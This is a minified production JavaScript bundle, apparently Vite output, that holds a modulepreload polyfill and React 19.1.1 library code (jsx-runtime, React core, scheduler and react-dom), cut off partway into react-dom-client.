(function () {
	const C = document.createElement("link").relList;
	if (C && C.supports && C.supports("modulepreload")) return;
	for (const w of document.querySelectorAll('link[rel="modulepreload"]'))
		h(w);
	new MutationObserver((w) => {
		for (const G of w)
			if (G.type === "childList")
				for (const ll of G.addedNodes)
					ll.tagName === "LINK" &&
						ll.rel === "modulepreload" &&
						h(ll);
	}).observe(document, { childList: !0, subtree: !0 });
	function j(w) {
		const G = {};
		return (
			w.integrity && (G.integrity = w.integrity),
			w.referrerPolicy && (G.referrerPolicy = w.referrerPolicy),
			w.crossOrigin === "use-credentials"
				? (G.credentials = "include")
				: w.crossOrigin === "anonymous"
				? (G.credentials = "omit")
				: (G.credentials = "same-origin"),
			G
		);
	}
	function h(w) {
		if (w.ep) return;
		w.ep = !0;
		const G = j(w);
		fetch(w.href, G);
	}
})();
var Fi = { exports: {} },
	yu = {};
/**
 * @license React
 * react-jsx-runtime.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ var Io;
function _h() {
	if (Io) return yu;
	Io = 1;
	var N = Symbol.for("react.transitional.element"),
		C = Symbol.for("react.fragment");
	function j(h, w, G) {
		var ll = null;
		if (
			(G !== void 0 && (ll = "" + G),
			w.key !== void 0 && (ll = "" + w.key),
			"key" in w)
		) {
			G = {};
			for (var Sl in w) Sl !== "key" && (G[Sl] = w[Sl]);
		} else G = w;
		return (
			(w = G.ref),
			{
				$$typeof: N,
				type: h,
				key: ll,
				ref: w !== void 0 ? w : null,
				props: G,
			}
		);
	}
	return (yu.Fragment = C), (yu.jsx = j), (yu.jsxs = j), yu;
}
var Po;
function Dh() {
	return Po || ((Po = 1), (Fi.exports = _h())), Fi.exports;
}
var f = Dh(),
	Ii = { exports: {} },
	Q = {};
/**
 * @license React
 * react.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ var ld;
function Rh() {
	if (ld) return Q;
	ld = 1;
	var N = Symbol.for("react.transitional.element"),
		C = Symbol.for("react.portal"),
		j = Symbol.for("react.fragment"),
		h = Symbol.for("react.strict_mode"),
		w = Symbol.for("react.profiler"),
		G = Symbol.for("react.consumer"),
		ll = Symbol.for("react.context"),
		Sl = Symbol.for("react.forward_ref"),
		_ = Symbol.for("react.suspense"),
		T = Symbol.for("react.memo"),
		D = Symbol.for("react.lazy"),
		W = Symbol.iterator;
	function $(r) {
		return r === null || typeof r != "object"
			? null
			: ((r = (W && r[W]) || r["@@iterator"]),
			  typeof r == "function" ? r : null);
	}
	var el = {
			isMounted: function () {
				return !1;
			},
			enqueueForceUpdate: function () {},
			enqueueReplaceState: function () {},
			enqueueSetState: function () {},
		},
		J = Object.assign,
		rl = {};
	function dl(r, E, M) {
		(this.props = r),
			(this.context = E),
			(this.refs = rl),
			(this.updater = M || el);
	}
	(dl.prototype.isReactComponent = {}),
		(dl.prototype.setState = function (r, E) {
			if (typeof r != "object" && typeof r != "function" && r != null)
				throw Error(
					"takes an object of state variables to update or a function which returns an object of state variables."
				);
			this.updater.enqueueSetState(this, r, E, "setState");
		}),
		(dl.prototype.forceUpdate = function (r) {
			this.updater.enqueueForceUpdate(this, r, "forceUpdate");
		});
	function xt() {}
	xt.prototype = dl.prototype;
	function Yl(r, E, M) {
		(this.props = r),
			(this.context = E),
			(this.refs = rl),
			(this.updater = M || el);
	}
	var vl = (Yl.prototype = new xt());
	(vl.constructor = Yl), J(vl, dl.prototype), (vl.isPureReactComponent = !0);
	var mt = Array.isArray,
		F = { H: null, A: null, T: null, S: null, V: null },
		Kl = Object.prototype.hasOwnProperty;
	function Jl(r, E, M, z, U, I) {
		return (
			(M = I.ref),
			{
				$$typeof: N,
				type: r,
				key: E,
				ref: M !== void 0 ? M : null,
				props: I,
			}
		);
	}
	function kl(r, E) {
		return Jl(r.type, E, void 0, void 0, void 0, r.props);
	}
	function bt(r) {
		return typeof r == "object" && r !== null && r.$$typeof === N;
	}
	function Ue(r) {
		var E = { "=": "=0", ":": "=2" };
		return (
			"$" +
			r.replace(/[=:]/g, function (M) {
				return E[M];
			})
		);
	}
	var zt = /\/+/g;
	function Ul(r, E) {
		return typeof r == "object" && r !== null && r.key != null
			? Ue("" + r.key)
			: E.toString(36);
	}
	function he() {}
	function me(r) {
		switch (r.status) {
			case "fulfilled":
				return r.value;
			case "rejected":
				throw r.reason;
			default:
				switch (
					(typeof r.status == "string"
						? r.then(he, he)
						: ((r.status = "pending"),
						  r.then(
								function (E) {
									r.status === "pending" &&
										((r.status = "fulfilled"),
										(r.value = E));
								},
								function (E) {
									r.status === "pending" &&
										((r.status = "rejected"),
										(r.reason = E));
								}
						  )),
					r.status)
				) {
					case "fulfilled":
						return r.value;
					case "rejected":
						throw r.reason;
				}
		}
		throw r;
	}
	function Hl(r, E, M, z, U) {
		var I = typeof r;
		(I === "undefined" || I === "boolean") && (r = null);
		var X = !1;
		if (r === null) X = !0;
		else
			switch (I) {
				case "bigint":
				case "string":
				case "number":
					X = !0;
					break;
				case "object":
					switch (r.$$typeof) {
						case N:
						case C:
							X = !0;
							break;
						case D:
							return (X = r._init), Hl(X(r._payload), E, M, z, U);
					}
			}
		if (X)
			return (
				(U = U(r)),
				(X = z === "" ? "." + Ul(r, 0) : z),
				mt(U)
					? ((M = ""),
					  X != null && (M = X.replace(zt, "$&/") + "/"),
					  Hl(U, E, M, "", function (Qt) {
							return Qt;
					  }))
					: U != null &&
					  (bt(U) &&
							(U = kl(
								U,
								M +
									(U.key == null || (r && r.key === U.key)
										? ""
										: ("" + U.key).replace(zt, "$&/") +
										  "/") +
									X
							)),
					  E.push(U)),
				1
			);
		X = 0;
		var Wl = z === "" ? "." : z + ":";
		if (mt(r))
			for (var hl = 0; hl < r.length; hl++)
				(z = r[hl]), (I = Wl + Ul(z, hl)), (X += Hl(z, E, M, I, U));
		else if (((hl = $(r)), typeof hl == "function"))
			for (r = hl.call(r), hl = 0; !(z = r.next()).done; )
				(z = z.value), (I = Wl + Ul(z, hl++)), (X += Hl(z, E, M, I, U));
		else if (I === "object") {
			if (typeof r.then == "function") return Hl(me(r), E, M, z, U);
			throw (
				((E = String(r)),
				Error(
					"Objects are not valid as a React child (found: " +
						(E === "[object Object]"
							? "object with keys {" +
							  Object.keys(r).join(", ") +
							  "}"
							: E) +
						"). If you meant to render a collection of children, use an array instead."
				))
			);
		}
		return X;
	}
	function b(r, E, M) {
		if (r == null) return r;
		var z = [],
			U = 0;
		return (
			Hl(r, z, "", "", function (I) {
				return E.call(M, I, U++);
			}),
			z
		);
	}
	function A(r) {
		if (r._status === -1) {
			var E = r._result;
			(E = E()),
				E.then(
					function (M) {
						(r._status === 0 || r._status === -1) &&
							((r._status = 1), (r._result = M));
					},
					function (M) {
						(r._status === 0 || r._status === -1) &&
							((r._status = 2), (r._result = M));
					}
				),
				r._status === -1 && ((r._status = 0), (r._result = E));
		}
		if (r._status === 1) return r._result.default;
		throw r._result;
	}
	var q =
		typeof reportError == "function"
			? reportError
			: function (r) {
					if (
						typeof window == "object" &&
						typeof window.ErrorEvent == "function"
					) {
						var E = new window.ErrorEvent("error", {
							bubbles: !0,
							cancelable: !0,
							message:
								typeof r == "object" &&
								r !== null &&
								typeof r.message == "string"
									? String(r.message)
									: String(r),
							error: r,
						});
						if (!window.dispatchEvent(E)) return;
					} else if (
						typeof process == "object" &&
						typeof process.emit == "function"
					) {
						process.emit("uncaughtException", r);
						return;
					}
					console.error(r);
			  };
	function fl() {}
	return (
		(Q.Children = {
			map: b,
			forEach: function (r, E, M) {
				b(
					r,
					function () {
						E.apply(this, arguments);
					},
					M
				);
			},
			count: function (r) {
				var E = 0;
				return (
					b(r, function () {
						E++;
					}),
					E
				);
			},
			toArray: function (r) {
				return (
					b(r, function (E) {
						return E;
					}) || []
				);
			},
			only: function (r) {
				if (!bt(r))
					throw Error(
						"React.Children.only expected to receive a single React element child."
					);
				return r;
			},
		}),
		(Q.Component = dl),
		(Q.Fragment = j),
		(Q.Profiler = w),
		(Q.PureComponent = Yl),
		(Q.StrictMode = h),
		(Q.Suspense = _),
		(Q.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE = F),
		(Q.__COMPILER_RUNTIME = {
			__proto__: null,
			c: function (r) {
				return F.H.useMemoCache(r);
			},
		}),
		(Q.cache = function (r) {
			return function () {
				return r.apply(null, arguments);
			};
		}),
		(Q.cloneElement = function (r, E, M) {
			if (r == null)
				throw Error(
					"The argument must be a React element, but you passed " +
						r +
						"."
				);
			var z = J({}, r.props),
				U = r.key,
				I = void 0;
			if (E != null)
				for (X in (E.ref !== void 0 && (I = void 0),
				E.key !== void 0 && (U = "" + E.key),
				E))
					!Kl.call(E, X) ||
						X === "key" ||
						X === "__self" ||
						X === "__source" ||
						(X === "ref" && E.ref === void 0) ||
						(z[X] = E[X]);
			var X = arguments.length - 2;
			if (X === 1) z.children = M;
			else if (1 < X) {
				for (var Wl = Array(X), hl = 0; hl < X; hl++)
					Wl[hl] = arguments[hl + 2];
				z.children = Wl;
			}
			return Jl(r.type, U, void 0, void 0, I, z);
		}),
		(Q.createContext = function (r) {
			return (
				(r = {
					$$typeof: ll,
					_currentValue: r,
					_currentValue2: r,
					_threadCount: 0,
					Provider: null,
					Consumer: null,
				}),
				(r.Provider = r),
				(r.Consumer = { $$typeof: G, _context: r }),
				r
			);
		}),
		(Q.createElement = function (r, E, M) {
			var z,
				U = {},
				I = null;
			if (E != null)
				for (z in (E.key !== void 0 && (I = "" + E.key), E))
					Kl.call(E, z) &&
						z !== "key" &&
						z !== "__self" &&
						z !== "__source" &&
						(U[z] = E[z]);
			var X = arguments.length - 2;
			if (X === 1) U.children = M;
			else if (1 < X) {
				for (var Wl = Array(X), hl = 0; hl < X; hl++)
					Wl[hl] = arguments[hl + 2];
				U.children = Wl;
			}
			if (r && r.defaultProps)
				for (z in ((X = r.defaultProps), X))
					U[z] === void 0 && (U[z] = X[z]);
			return Jl(r, I, void 0, void 0, null, U);
		}),
		(Q.createRef = function () {
			return { current: null };
		}),
		(Q.forwardRef = function (r) {
			return { $$typeof: Sl, render: r };
		}),
		(Q.isValidElement = bt),
		(Q.lazy = function (r) {
			return {
				$$typeof: D,
				_payload: { _status: -1, _result: r },
				_init: A,
			};
		}),
		(Q.memo = function (r, E) {
			return { $$typeof: T, type: r, compare: E === void 0 ? null : E };
		}),
		(Q.startTransition = function (r) {
			var E = F.T,
				M = {};
			F.T = M;
			try {
				var z = r(),
					U = F.S;
				U !== null && U(M, z),
					typeof z == "object" &&
						z !== null &&
						typeof z.then == "function" &&
						z.then(fl, q);
			} catch (I) {
				q(I);
			} finally {
				F.T = E;
			}
		}),
		(Q.unstable_useCacheRefresh = function () {
			return F.H.useCacheRefresh();
		}),
		(Q.use = function (r) {
			return F.H.use(r);
		}),
		(Q.useActionState = function (r, E, M) {
			return F.H.useActionState(r, E, M);
		}),
		(Q.useCallback = function (r, E) {
			return F.H.useCallback(r, E);
		}),
		(Q.useContext = function (r) {
			return F.H.useContext(r);
		}),
		(Q.useDebugValue = function () {}),
		(Q.useDeferredValue = function (r, E) {
			return F.H.useDeferredValue(r, E);
		}),
		(Q.useEffect = function (r, E, M) {
			var z = F.H;
			if (typeof M == "function")
				throw Error(
					"useEffect CRUD overload is not enabled in this build of React."
				);
			return z.useEffect(r, E);
		}),
		(Q.useId = function () {
			return F.H.useId();
		}),
		(Q.useImperativeHandle = function (r, E, M) {
			return F.H.useImperativeHandle(r, E, M);
		}),
		(Q.useInsertionEffect = function (r, E) {
			return F.H.useInsertionEffect(r, E);
		}),
		(Q.useLayoutEffect = function (r, E) {
			return F.H.useLayoutEffect(r, E);
		}),
		(Q.useMemo = function (r, E) {
			return F.H.useMemo(r, E);
		}),
		(Q.useOptimistic = function (r, E) {
			return F.H.useOptimistic(r, E);
		}),
		(Q.useReducer = function (r, E, M) {
			return F.H.useReducer(r, E, M);
		}),
		(Q.useRef = function (r) {
			return F.H.useRef(r);
		}),
		(Q.useState = function (r) {
			return F.H.useState(r);
		}),
		(Q.useSyncExternalStore = function (r, E, M) {
			return F.H.useSyncExternalStore(r, E, M);
		}),
		(Q.useTransition = function () {
			return F.H.useTransition();
		}),
		(Q.version = "19.1.1"),
		Q
	);
}
var td;
function af() {
	return td || ((td = 1), (Ii.exports = Rh())), Ii.exports;
}
var Vl = af(),
	Pi = { exports: {} },
	gu = {},
	lf = { exports: {} },
	tf = {};
/**
 * @license React
 * scheduler.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ var ed;
function Uh() {
	return (
		ed ||
			((ed = 1),
			(function (N) {
				function C(b, A) {
					var q = b.length;
					b.push(A);
					l: for (; 0 < q; ) {
						var fl = (q - 1) >>> 1,
							r = b[fl];
						if (0 < w(r, A)) (b[fl] = A), (b[q] = r), (q = fl);
						else break l;
					}
				}
				function j(b) {
					return b.length === 0 ? null : b[0];
				}
				function h(b) {
					if (b.length === 0) return null;
					var A = b[0],
						q = b.pop();
					if (q !== A) {
						b[0] = q;
						l: for (
							var fl = 0, r = b.length, E = r >>> 1;
							fl < E;

						) {
							var M = 2 * (fl + 1) - 1,
								z = b[M],
								U = M + 1,
								I = b[U];
							if (0 > w(z, q))
								U < r && 0 > w(I, z)
									? ((b[fl] = I), (b[U] = q), (fl = U))
									: ((b[fl] = z), (b[M] = q), (fl = M));
							else if (U < r && 0 > w(I, q))
								(b[fl] = I), (b[U] = q), (fl = U);
							else break l;
						}
					}
					return A;
				}
				function w(b, A) {
					var q = b.sortIndex - A.sortIndex;
					return q !== 0 ? q : b.id - A.id;
				}
				if (
					((N.unstable_now = void 0),
					typeof performance == "object" &&
						typeof performance.now == "function")
				) {
					var G = performance;
					N.unstable_now = function () {
						return G.now();
					};
				} else {
					var ll = Date,
						Sl = ll.now();
					N.unstable_now = function () {
						return ll.now() - Sl;
					};
				}
				var _ = [],
					T = [],
					D = 1,
					W = null,
					$ = 3,
					el = !1,
					J = !1,
					rl = !1,
					dl = !1,
					xt = typeof setTimeout == "function" ? setTimeout : null,
					Yl =
						typeof clearTimeout == "function" ? clearTimeout : null,
					vl = typeof setImmediate < "u" ? setImmediate : null;
				function mt(b) {
					for (var A = j(T); A !== null; ) {
						if (A.callback === null) h(T);
						else if (A.startTime <= b)
							h(T), (A.sortIndex = A.expirationTime), C(_, A);
						else break;
						A = j(T);
					}
				}
				function F(b) {
					if (((rl = !1), mt(b), !J))
						if (j(_) !== null) (J = !0), Kl || ((Kl = !0), Ul());
						else {
							var A = j(T);
							A !== null && Hl(F, A.startTime - b);
						}
				}
				var Kl = !1,
					Jl = -1,
					kl = 5,
					bt = -1;
				function Ue() {
					return dl ? !0 : !(N.unstable_now() - bt < kl);
				}
				function zt() {
					if (((dl = !1), Kl)) {
						var b = N.unstable_now();
						bt = b;
						var A = !0;
						try {
							l: {
								(J = !1),
									rl && ((rl = !1), Yl(Jl), (Jl = -1)),
									(el = !0);
								var q = $;
								try {
									t: {
										for (
											mt(b), W = j(_);
											W !== null &&
											!(W.expirationTime > b && Ue());

										) {
											var fl = W.callback;
											if (typeof fl == "function") {
												(W.callback = null),
													($ = W.priorityLevel);
												var r = fl(
													W.expirationTime <= b
												);
												if (
													((b = N.unstable_now()),
													typeof r == "function")
												) {
													(W.callback = r),
														mt(b),
														(A = !0);
													break t;
												}
												W === j(_) && h(_), mt(b);
											} else h(_);
											W = j(_);
										}
										if (W !== null) A = !0;
										else {
											var E = j(T);
											E !== null &&
												Hl(F, E.startTime - b),
												(A = !1);
										}
									}
									break l;
								} finally {
									(W = null), ($ = q), (el = !1);
								}
								A = void 0;
							}
						} finally {
							A ? Ul() : (Kl = !1);
						}
					}
				}
				var Ul;
				if (typeof vl == "function")
					Ul = function () {
						vl(zt);
					};
				else if (typeof MessageChannel < "u") {
					var he = new MessageChannel(),
						me = he.port2;
					(he.port1.onmessage = zt),
						(Ul = function () {
							me.postMessage(null);
						});
				} else
					Ul = function () {
						xt(zt, 0);
					};
				function Hl(b, A) {
					Jl = xt(function () {
						b(N.unstable_now());
					}, A);
				}
				(N.unstable_IdlePriority = 5),
					(N.unstable_ImmediatePriority = 1),
					(N.unstable_LowPriority = 4),
					(N.unstable_NormalPriority = 3),
					(N.unstable_Profiling = null),
					(N.unstable_UserBlockingPriority = 2),
					(N.unstable_cancelCallback = function (b) {
						b.callback = null;
					}),
					(N.unstable_forceFrameRate = function (b) {
						0 > b || 125 < b
							? console.error(
									"forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"
							  )
							: (kl = 0 < b ? Math.floor(1e3 / b) : 5);
					}),
					(N.unstable_getCurrentPriorityLevel = function () {
						return $;
					}),
					(N.unstable_next = function (b) {
						switch ($) {
							case 1:
							case 2:
							case 3:
								var A = 3;
								break;
							default:
								A = $;
						}
						var q = $;
						$ = A;
						try {
							return b();
						} finally {
							$ = q;
						}
					}),
					(N.unstable_requestPaint = function () {
						dl = !0;
					}),
					(N.unstable_runWithPriority = function (b, A) {
						switch (b) {
							case 1:
							case 2:
							case 3:
							case 4:
							case 5:
								break;
							default:
								b = 3;
						}
						var q = $;
						$ = b;
						try {
							return A();
						} finally {
							$ = q;
						}
					}),
					(N.unstable_scheduleCallback = function (b, A, q) {
						var fl = N.unstable_now();
						switch (
							(typeof q == "object" && q !== null
								? ((q = q.delay),
								  (q =
										typeof q == "number" && 0 < q
											? fl + q
											: fl))
								: (q = fl),
							b)
						) {
							case 1:
								var r = -1;
								break;
							case 2:
								r = 250;
								break;
							case 5:
								r = 1073741823;
								break;
							case 4:
								r = 1e4;
								break;
							default:
								r = 5e3;
						}
						return (
							(r = q + r),
							(b = {
								id: D++,
								callback: A,
								priorityLevel: b,
								startTime: q,
								expirationTime: r,
								sortIndex: -1,
							}),
							q > fl
								? ((b.sortIndex = q),
								  C(T, b),
								  j(_) === null &&
										b === j(T) &&
										(rl ? (Yl(Jl), (Jl = -1)) : (rl = !0),
										Hl(F, q - fl)))
								: ((b.sortIndex = r),
								  C(_, b),
								  J ||
										el ||
										((J = !0), Kl || ((Kl = !0), Ul()))),
							b
						);
					}),
					(N.unstable_shouldYield = Ue),
					(N.unstable_wrapCallback = function (b) {
						var A = $;
						return function () {
							var q = $;
							$ = A;
							try {
								return b.apply(this, arguments);
							} finally {
								$ = q;
							}
						};
					});
			})(tf)),
		tf
	);
}
var ad;
function Hh() {
	return ad || ((ad = 1), (lf.exports = Uh())), lf.exports;
}
var ef = { exports: {} },
	ql = {};
/**
 * @license React
 * react-dom.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ var ud;
function Ch() {
	if (ud) return ql;
	ud = 1;
	var N = af();
	function C(_) {
		var T = "https://react.dev/errors/" + _;
		if (1 < arguments.length) {
			T += "?args[]=" + encodeURIComponent(arguments[1]);
			for (var D = 2; D < arguments.length; D++)
				T += "&args[]=" + encodeURIComponent(arguments[D]);
		}
		return (
			"Minified React error #" +
			_ +
			"; visit " +
			T +
			" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
		);
	}
	function j() {}
	var h = {
			d: {
				f: j,
				r: function () {
					throw Error(C(522));
				},
				D: j,
				C: j,
				L: j,
				m: j,
				X: j,
				S: j,
				M: j,
			},
			p: 0,
			findDOMNode: null,
		},
		w = Symbol.for("react.portal");
	function G(_, T, D) {
		var W =
			3 < arguments.length && arguments[3] !== void 0
				? arguments[3]
				: null;
		return {
			$$typeof: w,
			key: W == null ? null : "" + W,
			children: _,
			containerInfo: T,
			implementation: D,
		};
	}
	var ll = N.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;
	function Sl(_, T) {
		if (_ === "font") return "";
		if (typeof T == "string") return T === "use-credentials" ? T : "";
	}
	return (
		(ql.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE = h),
		(ql.createPortal = function (_, T) {
			var D =
				2 < arguments.length && arguments[2] !== void 0
					? arguments[2]
					: null;
			if (
				!T ||
				(T.nodeType !== 1 && T.nodeType !== 9 && T.nodeType !== 11)
			)
				throw Error(C(299));
			return G(_, T, null, D);
		}),
		(ql.flushSync = function (_) {
			var T = ll.T,
				D = h.p;
			try {
				if (((ll.T = null), (h.p = 2), _)) return _();
			} finally {
				(ll.T = T), (h.p = D), h.d.f();
			}
		}),
		(ql.preconnect = function (_, T) {
			typeof _ == "string" &&
				(T
					? ((T = T.crossOrigin),
					  (T =
							typeof T == "string"
								? T === "use-credentials"
									? T
									: ""
								: void 0))
					: (T = null),
				h.d.C(_, T));
		}),
		(ql.prefetchDNS = function (_) {
			typeof _ == "string" && h.d.D(_);
		}),
		(ql.preinit = function (_, T) {
			if (typeof _ == "string" && T && typeof T.as == "string") {
				var D = T.as,
					W = Sl(D, T.crossOrigin),
					$ = typeof T.integrity == "string" ? T.integrity : void 0,
					el =
						typeof T.fetchPriority == "string"
							? T.fetchPriority
							: void 0;
				D === "style"
					? h.d.S(
							_,
							typeof T.precedence == "string"
								? T.precedence
								: void 0,
							{ crossOrigin: W, integrity: $, fetchPriority: el }
					  )
					: D === "script" &&
					  h.d.X(_, {
							crossOrigin: W,
							integrity: $,
							fetchPriority: el,
							nonce:
								typeof T.nonce == "string" ? T.nonce : void 0,
					  });
			}
		}),
		(ql.preinitModule = function (_, T) {
			if (typeof _ == "string")
				if (typeof T == "object" && T !== null) {
					if (T.as == null || T.as === "script") {
						var D = Sl(T.as, T.crossOrigin);
						h.d.M(_, {
							crossOrigin: D,
							integrity:
								typeof T.integrity == "string"
									? T.integrity
									: void 0,
							nonce:
								typeof T.nonce == "string" ? T.nonce : void 0,
						});
					}
				} else T == null && h.d.M(_);
		}),
		(ql.preload = function (_, T) {
			if (
				typeof _ == "string" &&
				typeof T == "object" &&
				T !== null &&
				typeof T.as == "string"
			) {
				var D = T.as,
					W = Sl(D, T.crossOrigin);
				h.d.L(_, D, {
					crossOrigin: W,
					integrity:
						typeof T.integrity == "string" ? T.integrity : void 0,
					nonce: typeof T.nonce == "string" ? T.nonce : void 0,
					type: typeof T.type == "string" ? T.type : void 0,
					fetchPriority:
						typeof T.fetchPriority == "string"
							? T.fetchPriority
							: void 0,
					referrerPolicy:
						typeof T.referrerPolicy == "string"
							? T.referrerPolicy
							: void 0,
					imageSrcSet:
						typeof T.imageSrcSet == "string"
							? T.imageSrcSet
							: void 0,
					imageSizes:
						typeof T.imageSizes == "string" ? T.imageSizes : void 0,
					media: typeof T.media == "string" ? T.media : void 0,
				});
			}
		}),
		(ql.preloadModule = function (_, T) {
			if (typeof _ == "string")
				if (T) {
					var D = Sl(T.as, T.crossOrigin);
					h.d.m(_, {
						as:
							typeof T.as == "string" && T.as !== "script"
								? T.as
								: void 0,
						crossOrigin: D,
						integrity:
							typeof T.integrity == "string"
								? T.integrity
								: void 0,
					});
				} else h.d.m(_);
		}),
		(ql.requestFormReset = function (_) {
			h.d.r(_);
		}),
		(ql.unstable_batchedUpdates = function (_, T) {
			return _(T);
		}),
		(ql.useFormState = function (_, T, D) {
			return ll.H.useFormState(_, T, D);
		}),
		(ql.useFormStatus = function () {
			return ll.H.useHostTransitionStatus();
		}),
		(ql.version = "19.1.1"),
		ql
	);
}
var nd;
function Bh() {
	if (nd) return ef.exports;
	nd = 1;
	function N() {
		if (
			!(
				typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" ||
				typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"
			)
		)
			try {
				__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(N);
			} catch (C) {
				console.error(C);
			}
	}
	return N(), (ef.exports = Ch()), ef.exports;
}
/**
 * @license React
 * react-dom-client.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ var cd;
function qh() {
	if (cd) return gu;
	cd = 1;
	var N = Hh(),
		C = af(),
		j = Bh();
	function h(l) {
		var t = "https://react.dev/errors/" + l;
		if (1 < arguments.length) {
			t += "?args[]=" + encodeURIComponent(arguments[1]);
			for (var e = 2; e < arguments.length; e++)
				t += "&args[]=" + encodeURIComponent(arguments[e]);
		}
		return (
			"Minified React error #" +
			l +
			"; visit " +
			t +
			" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
		);
	}
	function w(l) {
		return !(
			!l ||
			(l.nodeType !== 1 && l.nodeType !== 9 && l.nodeType !== 11)
		);
	}
	function G(l) {
		var t = l,
			e = l;
		if (l.alternate) for (; t.return; ) t = t.return;
		else {
			l = t;
			do
				(t = l),
					(t.flags & 4098) !== 0 && (e = t.return),
					(l = t.return);
			while (l);
		}
		return t.tag === 3 ? e : null;
	}
	function ll(l) {
		if (l.tag === 13) {
			var t = l.memoizedState;
			if (
				(t === null &&
					((l = l.alternate), l !== null && (t = l.memoizedState)),
				t !== null)
			)
				return t.dehydrated;
		}
		return null;
	}
	function Sl(l) {
		if (G(l) !== l) throw Error(h(188));
	}
	function _(l) {
		var t = l.alternate;
		if (!t) {
			if (((t = G(l)), t === null)) throw Error(h(188));
			return t !== l ? null : l;
		}
		for (var e = l, a = t; ; ) {
			var u = e.return;
			if (u === null) break;
			var n = u.alternate;
			if (n === null) {
				if (((a = u.return), a !== null)) {
					e = a;
					continue;
				}
				break;
			}
			if (u.child === n.child) {
				for (n = u.child; n; ) {
					if (n === e) return Sl(u), l;
					if (n === a) return Sl(u), t;
					n = n.sibling;
				}
				throw Error(h(188));
			}
			if (e.return !== a.return) (e = u), (a = n);
			else {
				for (var c = !1, i = u.child; i; ) {
					if (i === e) {
						(c = !0), (e = u), (a = n);
						break;
					}
					if (i === a) {
						(c = !0), (a = u), (e = n);
						break;
					}
					i = i.sibling;
				}
				if (!c) {
					for (i = n.child; i; ) {
						if (i === e) {
							(c = !0), (e = n), (a = u);
							break;
						}
						if (i === a) {
							(c = !0), (a = n), (e = u);
							break;
						}
						i = i.sibling;
					}
					if (!c) throw Error(h(189));
				}
			}
			if (e.alternate !== a) throw Error(h(190));
		}
		if (e.tag !== 3) throw Error(h(188));
		return e.stateNode.current === e ? l : t;
	}
	function T(l) {
		var t = l.tag;
		if (t === 5 || t === 26 || t === 27 || t === 6) return l;
		for (l = l.child; l !== null; ) {
			if (((t = T(l)), t !== null)) return t;
			l = l.sibling;
		}
		return null;
	}
	var D = Object.assign,
		W = Symbol.for("react.element"),
		$ = Symbol.for("react.transitional.element"),
		el = Symbol.for("react.portal"),
		J = Symbol.for("react.fragment"),
		rl = Symbol.for("react.strict_mode"),
		dl = Symbol.for("react.profiler"),
		xt = Symbol.for("react.provider"),
		Yl = Symbol.for("react.consumer"),
		vl = Symbol.for("react.context"),
		mt = Symbol.for("react.forward_ref"),
		F = Symbol.for("react.suspense"),
		Kl = Symbol.for("react.suspense_list"),
		Jl = Symbol.for("react.memo"),
		kl = Symbol.for("react.lazy"),
		bt = Symbol.for("react.activity"),
		Ue = Symbol.for("react.memo_cache_sentinel"),
		zt = Symbol.iterator;
	function Ul(l) {
		return l === null || typeof l != "object"
			? null
			: ((l = (zt && l[zt]) || l["@@iterator"]),
			  typeof l == "function" ? l : null);
	}
	var he = Symbol.for("react.client.reference");
	function me(l) {
		if (l == null) return null;
		if (typeof l == "function")
			return l.$$typeof === he ? null : l.displayName || l.name || null;
		if (typeof l == "string") return l;
		switch (l) {
			case J:
				return "Fragment";
			case dl:
				return "Profiler";
			case rl:
				return "StrictMode";
			case F:
				return "Suspense";
			case Kl:
				return "SuspenseList";
			case bt:
				return "Activity";
		}
		if (typeof l == "object")
			switch (l.$$typeof) {
				case el:
					return "Portal";
				case vl:
					return (l.displayName || "Context") + ".Provider";
				case Yl:
					return (l._context.displayName || "Context") + ".Consumer";
				case mt:
					var t = l.render;
					return (
						(l = l.displayName),
						l ||
							((l = t.displayName || t.name || ""),
							(l =
								l !== ""
									? "ForwardRef(" + l + ")"
									: "ForwardRef")),
						l
					);
				case Jl:
					return (
						(t = l.displayName || null),
						t !== null ? t : me(l.type) || "Memo"
					);
				case kl:
					(t = l._payload), (l = l._init);
					try {
						return me(l(t));
					} catch {}
			}
		return null;
	}
	var Hl = Array.isArray,
		b = C.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,
		A = j.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,
		q = { pending: !1, data: null, method: null, action: null },
		fl = [],
		r = -1;
	function E(l) {
		return { current: l };
	}
	function M(l) {
		0 > r || ((l.current = fl[r]), (fl[r] = null), r--);
	}
	function z(l, t) {
		r++, (fl[r] = l.current), (l.current = t);
	}
	var U = E(null),
		I = E(null),
		X = E(null),
		Wl = E(null);
	function hl(l, t) {
		switch ((z(X, t), z(I, l), z(U, null), t.nodeType)) {
			case 9:
			case 11:
				l = (l = t.documentElement) && (l = l.namespaceURI) ? zo(l) : 0;
				break;
			default:
				if (((l = t.tagName), (t = t.namespaceURI)))
					(t = zo(t)), (l = Ao(t, l));
				else
					switch (l) {
						case "svg":
							l = 1;
							break;
						case "math":
							l = 2;
							break;
						default:
							l = 0;
					}
		}
		M(U), z(U, l);
	}
	function Qt() {
		M(U), M(I), M(X);
	}
	function Bn(l) {
		l.memoizedState !== null && z(Wl, l);
		var t = U.current,
			e = Ao(t, l.type);
		t !== e && (z(I, l), z(U, e));
	}
